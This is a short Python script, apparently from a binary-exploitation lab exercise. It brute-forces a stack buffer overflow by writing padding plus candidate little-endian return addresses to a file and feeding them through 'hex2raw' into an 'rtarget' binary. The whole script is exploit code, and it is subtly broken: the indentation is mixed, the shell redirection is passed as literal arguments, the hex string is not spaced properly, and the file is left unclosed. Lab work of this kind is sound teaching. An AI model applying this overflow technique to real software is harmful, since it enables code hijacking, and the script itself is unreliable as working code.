import subprocess as sp
import pdb

for i in range(4201265,4201323):
    d = hex(i)[2:]
    output = ""
    for i in range(len(d),0,-2):
        output = output + d[i-2:i]

    out_buffer = "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" + output + "00 00 00 00"

    text_file = open("exploit4.txt", "w")
    text_file.write("%s" % out_buffer)

	sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"])
